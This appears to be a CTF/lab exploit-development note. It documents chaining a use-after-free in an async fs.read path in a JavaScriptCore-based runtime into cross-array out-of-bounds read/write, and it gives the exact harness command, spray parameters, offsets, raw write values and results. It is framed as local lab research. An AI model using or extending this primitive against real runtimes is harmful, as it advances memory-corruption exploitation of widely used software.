# Chained double-array OOB primitive - 2026-05-10

Scope: local CTF/lab primitive escalation using the async `fs.read`
BufferSource UAF. This still requires local JS access to `node:fs` and is not
request-reachable from the hardened CTF server.

## Primitive

Harness:

- `lab/harnesses/13-arb-rw-probes/fs-read-array-metadata-write.js`

The initial stale write targets reclaimed JSC double-array butterfly metadata:

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0 \
TIMEOUT=30 ITERATIONS=4 SPRAY_COUNT=4096 BUF_SIZE=8192 SLOTS=1024 \
WRITE_OFFSET=136 NEW_LENGTH=2048 READ_OOB=1 OOB_COUNT=288 \
OOB_WRITE_INDEX=255 OOB_WRITE_U64=0x0000080000000800 \
COLLATERAL_OOB_COUNT=288 COLLATERAL_WRITE_INDEX=256 \
COLLATERAL_WRITE_VALUE=9.87654321098765e+122 \
lab/scripts/triage.sh lab/harnesses/13-arb-rw-probes/fs-read-array-metadata-write.js
```

Log:

- `lab/findings/runs/20260510T033802Z-91715/asan.log`

Result:

1. The UAF corrupts array `368` length from `1024` to `2048`.
2. Array `368[1024 + 255]` maps to the neighboring array `45` length metadata.
3. Writing raw bits `0x0000080000000800` through that OOB slot changes array
   `45` length from `1024` to `2048`.
4. Array `45[1024 + 256]` maps to array `49[0]`.
5. Writing `9.87654321098765e+122` through array `45` changes array `49[0]`
   to that exact value without an ASAN crash.

This proves that the initial stale write can be composed into a chained
JS-visible OOB read/write across multiple double-array butterflies. It is
stronger than the earlier one-hop proof because the first corrupted array can
create another corrupted array, and the second corrupted array can write into a
third allocation.

## Boundary

The primitive remains type-limited in the stable proof: it cleanly reads and
writes double-array storage. Attempts to mix object-array victims into the same
layout have so far hit ASAN redzones before producing a stable addrof/fakeobj
bridge. ArrayBuffer metadata corruption is separately confirmed, but a stable
backing-pointer alias has not been obtained.
